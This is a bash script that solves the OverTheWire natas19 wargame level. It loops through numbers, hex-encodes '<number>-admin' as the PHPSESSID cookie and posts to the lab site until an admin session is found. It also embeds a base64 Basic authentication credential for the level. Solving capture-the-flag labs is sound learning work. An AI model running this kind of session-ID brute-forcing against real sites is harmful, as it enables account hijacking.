#!/bin/bash

num=1

pwned=0

while [[ $pwned = 0 ]]; do
  if [[ $num = 640 ]]; then pwned=1; fi
  hexnum=$(printf "$num-admin" | xxd -p)

  RESPONSE=$(curl 'http://natas19.natas.labs.overthewire.org/index.php' \
    -H 'Authorization: Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==' \
    -H 'Referer: http://natas19.natas.labs.overthewire.org/' \
    -H "Cookie: PHPSESSID=$hexnum" \
    --silent \
    --data 'username=admin&password=asdfasdf')

  honeypot='You are logged in as a regular user'
  if [[ "$RESPONSE" =~ $honeypot ]]; then
    echo "Attempt with $num failed"
    # echo $RESPONSE
  else
    echo "Succeeded with $num:"
    echo $RESPONSE
    pwned=1
  fi

  num=$((num+1))
done
